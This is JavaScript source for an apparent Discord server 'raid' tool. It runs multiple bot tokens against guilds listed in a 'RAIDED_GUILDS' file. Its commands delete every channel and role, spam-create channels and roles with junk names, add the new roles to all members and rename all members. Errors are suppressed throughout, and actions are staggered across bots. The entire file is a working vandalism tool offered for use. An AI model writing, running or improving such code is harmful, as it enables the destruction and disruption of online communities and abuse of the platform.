process.stdout.write('\x1Bc')

let connectedBots = [];

// Variables
const { Client, Intents } = require('discord.js');
const dotaShit = require('./dotaShit.json')
const animeShit = require('./animeShit.json')
const TOKENS = require('./TOKENS.json')
const BOTS = require('./BOTS.json')
const GUILDS = require('./RAIDED_GUILDS.json')
const utils = require('./utils.js');

// [start] Input handler
const Prompt = require('serverline')

Prompt.init()
Prompt.setCompletion(
    [
        'help',
        'createChannels',
        'createRoles',
        'deleteChannels',
        'deleteRoles'
    ])

let lastCommand = ''

Prompt.on('line', (line) => {

    switch (line) {
        case 'help':
            console.log(
                'createChannels amount:int\n' +
                'createRoles amount:int\n' +
                'deleteChannels\n' +
                'deleteRoles'
            )
        default:
            const lineFirstWord = line.split(' ')[0]
            
            if (!(lineFirstWord in connectedBots[0])) {
                console.warn(`Undefined option: ${lineFirstWord}, type help for more info`)
                break
            }

            for (let botHandler of connectedBots) {
                botHandler[lineFirstWord](line)
            }
    }

    lastCommand = line

    if (Prompt.isMuted()) {
        Prompt.setMuted(false)
    }

})

Prompt.on('SIGINT', function (rl) {
    rl.question('Confirm exit: ', (answer) => answer.match(/^y(es)?$/i) ? process.exit(0) : rl.output.write('\x1B[1K> '))
})
// [end] Input handler

function launch(token, delay) {
    const allIntents = new Intents(32767);
    const client = new Client({ intents: allIntents });

    client.on('ready', () => {
        console.log(`Logged in as ${client.user.tag}!`);
    });

    let command = {
        'options': (message) => {
            if (typeof message === 'string') {
                const options = message.split(' ')
                const guild = client.guilds.cache.get(GUILDS[0])

                return { options, guild }
            }
            else {
                const options = message.content.split(' ')
                const channel = client.channels.cache.get(message.channelId)
                const guild = client.guilds.cache.get(message.guildId)
                
                return { options, guild }
            }
        },
        'help': (message) => {
            //
        },
        'changeNicks': (message) => {
            const base = command.options(message);
            const guildMembers = base.guild.members.cache

            for (let member of guildMembers) {
                member[1].setNickname(base.options[1]).catch(error => { })

            }
        },
        'createChannels': (message) => {
            const base = command.options(message);
            const cycles = base.options[1]

            for (let i = 0; i < cycles; i++) {
                setTimeout(() => {
                    base.guild.channels.create(utils.getRandomItem(animeShit), {
                        type: utils.getRandomItem(["GUILD_VOICE", "GUILD_TEXT"]),
                    })
                        .then(channel => { console.log(`Channel ${channel.name} created`) })
                        .catch(error => {
                            // console.warn('Something wrong', '[createChannels]')
                        })
                }, delay)
            }
        },
        'deleteChannels': (message) => {
            const base = command.options(message);

            for (let channel of base.guild.channels.cache) {
                if (channel[1].name !== 'root') {
                    channel[1].delete('Because I can').catch(error => {
                        // console.warn('Something wrong', '[deleteChannels]')
                    })
                }
            }
        },
        'createRoles': (message) => {
            const base = command.options(message);
            const cycles = base.options[1]

            for (let i = 0; i < cycles; i++) {
                setTimeout(() => {
                    base.guild.roles.create({
                        name: utils.getRandomItem(dotaShit),
                        color: "RANDOM"
                    })
                        .then(role => {
                            console.log(`Role ${role.name} created`)
                            for (let member of base.guild.members.cache) {
                                member[1].roles.add(role)
                            }
                        })
                        .catch(error => {
                            // console.warn('Something wrong', '[createRoles]')
                        })
                }, delay
                )
            }

        },
        'deleteRoles': (message) => {
            const base = command.options(message);

            for (let role of base.guild.roles.cache) {
                setTimeout(() => { 

                    role[1].delete('Because I can')
                        .then(role => {
                            if (lastCommand !== message) {
                                console.log(`Role ${role.name} deleted`)
                            }
                        })
                        .catch(error => {
                            // console.warn('Something wrong', '[deleteRoles]')
                        })
                }, delay / 3
                )
            }
        }
    }

    client.on('messageCreate', (message) => {
        let firstWord = message.content.split(' ')[0]
        let channel = client.channels.cache.get(message.channelId)

        if (message.author.id === client.user.id || BOTS.indexOf(message.author.id) !== -1) {
            return;
        }

        if (firstWord in command) {
            command[firstWord](message)

            channel.send(`[${firstWord}] successfully executed`);
        }
        else {
            channel.send('Undefined option');
        }
    });

    client.login(token);

    return command
}

let delay = 300;
for (let nickname in TOKENS) {
    const token = TOKENS[nickname]
    let commandHanlder = launch(token, delay)

    connectedBots.push(commandHanlder)

    delay += 500;
}


